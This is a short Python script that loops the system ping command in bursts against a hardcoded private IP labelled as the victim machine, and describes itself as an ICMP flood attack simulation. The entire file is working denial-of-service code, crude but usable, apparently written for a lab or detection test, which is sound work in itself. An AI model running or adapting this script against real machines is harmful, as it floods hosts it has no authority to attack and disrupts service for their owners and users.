import subprocess
import time

TARGET_IP = "172.17.18.153"   # Victim machine IP
COUNT_PER_BURST = 50
SLEEP_BETWEEN_BURSTS = 0.1
TOTAL_BURSTS = 100

print("=== ICMP FLOOD SIMULATION STARTED ===")
print(f"Target: {TARGET_IP}")

sent = 0

try:
    for i in range(TOTAL_BURSTS):
        subprocess.run(
            ["ping", "-n", str(COUNT_PER_BURST), TARGET_IP],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        sent += COUNT_PER_BURST
        print(f"[INFO] Sent {sent} ping requests")
        time.sleep(SLEEP_BETWEEN_BURSTS)

except KeyboardInterrupt:
    print("\n[WARN] Attack stopped manually")

print("\n=== ATTACK SIMULATION COMPLETE ===")
